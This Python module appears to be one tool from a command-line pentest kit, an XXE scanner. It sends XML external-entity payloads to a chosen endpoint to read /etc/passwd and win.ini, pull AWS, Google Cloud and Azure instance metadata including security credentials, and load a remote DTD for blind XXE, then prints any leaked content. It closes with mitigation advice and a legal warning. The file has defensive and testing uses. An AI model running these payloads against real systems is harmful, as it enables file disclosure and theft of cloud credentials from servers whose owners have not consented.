import requests
import urllib.parse
from colorama import init, Fore, Style

init(autoreset=True)


def run():
    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}║{Fore.GREEN}              XXE VULNERABILITY SCANNER                            {Fore.CYAN}║")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    target = input(f"\n{Fore.YELLOW}Enter target URL (POST endpoint that accepts XML): {Style.RESET_ALL}").strip()

    if not target:
        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    if not target.startswith(('http://', 'https://')):
        print(f"\n{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}[+] Testing for XXE vulnerability at: {target}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Sending XML payloads with external entity declarations{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}XXE TESTING RESULTS")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    vulnerable = False
    headers = {'Content-Type': 'application/xml'}

    payloads = [
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "Linux /etc/passwd",
            ["root:x:", "daemon:x:", "bin:x:"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            "Windows win.ini",
            ["[extensions]", "[fonts]", "for 16-bit app support"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            "AWS EC2 Metadata",
            ["ami-id", "instance-id", "security-credentials"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
            "Google Cloud Metadata",
            ["project", "instance", "attributes"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/v1/">]><foo>&xxe;</foo>',
            "Azure Metadata",
            ["compute", "network", "platform"]
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:8080/evil.dtd">%xxe;]><foo></foo>',
            "Blind XXE (Out-of-band)",
            []
        )
    ]

    for payload, description, indicators in payloads:
        try:
            if "169.254.169.254" in payload or "metadata.google.internal" in payload:
                test_headers = {**headers, 'Metadata': 'true'}
            else:
                test_headers = headers

            response = requests.post(target, data=payload, headers=test_headers, timeout=12, verify=False)

            if indicators and any(ind in response.text for ind in indicators):
                vulnerable = True
                severity = Fore.MAGENTA + Style.BRIGHT if "Metadata" in description else Fore.RED
                print(f"{severity}[!] XXE VULNERABILITY CONFIRMED{Style.RESET_ALL}")
                print(f"    Type: {description}")
                print(f"    Payload used: {payload[:80]}...")
                print(f"    Status: {response.status_code}")

                if "Metadata" in description:
                    print(f"    {Fore.YELLOW}  CLOUD METADATA EXPOSED - CRITICAL RISK{Style.RESET_ALL}")
                elif "passwd" in description or "win.ini" in description:
                    print(f"    {Fore.YELLOW}  SENSITIVE FILE DISCLOSED - HIGH RISK{Style.RESET_ALL}")

                snippet = response.text[:400]
                if snippet:
                    print(f"    Response snippet:")
                    for line in snippet.split('\n')[:5]:
                        if line.strip():
                            print(f"      {line[:100]}")
                print()
                break

            elif response.status_code >= 500:
                print(f"{Fore.YELLOW}[?] Server error with payload ({description}){Style.RESET_ALL}")
                print(f"    Status: {response.status_code} - May indicate parsing vulnerability")

        except requests.exceptions.Timeout:
            if "Blind" in description:
                print(f"{Fore.YELLOW}[?] Timeout on blind XXE payload - possible firewall block{Style.RESET_ALL}")
        except Exception as e:
            continue

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}XXE TESTING COMPLETE")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    if vulnerable:
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}[!] CRITICAL XXE VULNERABILITY DETECTED{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Risk Level: CRITICAL{Style.RESET_ALL}")
        print(f"   • Full server file system accessible")
        print(f"   • Cloud credentials compromisable via metadata APIs")
        print(f"   • Internal network scanning possible (SSRF via XXE)")
        print(f"   • Denial-of-Service via billion laughs attack")

        print(f"\n{Fore.YELLOW}Immediate Mitigations:{Style.RESET_ALL}")
        print(f"   • Disable DTD processing in XML parsers:")
        print(f"        Python (lxml): parser = etree.XMLParser(resolve_entities=False)")
        print(f"        Java: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)")
        print(f"        PHP: libxml_disable_entity_loader(true)")
        print(f"   • Use JSON instead of XML where possible")
        print(f"   • Implement strict input validation")
        print(f"   • For cloud environments:")
        print(f"        - Block metadata IPs at firewall level")
        print(f"        - Enable IMDSv2 with hop limit 1 (AWS)")
        print(f"   • Patch XML libraries to latest versions")
    else:
        print(f"\n{Fore.GREEN}[✓] No obvious XXE vulnerabilities detected{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Important Notes:{Style.RESET_ALL}")
        print(f"   • XXE is context-dependent - false negatives common")
        print(f"   • Test with authenticated sessions")
        print(f"   • Blind XXE requires out-of-band detection (Burp Collaborator)")
        print(f"   • Check file uploads (SVG, DOCX contain XML)")
        print(f"   • Manual testing recommended for critical systems")
        print(f"\n{Fore.CYAN}Common XXE entry points:{Style.RESET_ALL}")
        print(f"   • SOAP APIs")
        print(f"   • SVG file uploads")
        print(f"   • Office document processors")
        print(f"   • SAML authentication endpoints")

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.GREEN}[✓] XXE analysis completed{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}⚠️  LEGAL WARNING:{Style.RESET_ALL}")
    print(f"   XXE exploitation without authorization carries severe penalties.")
    print(f"   Always obtain written permission before testing file access.")

    input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")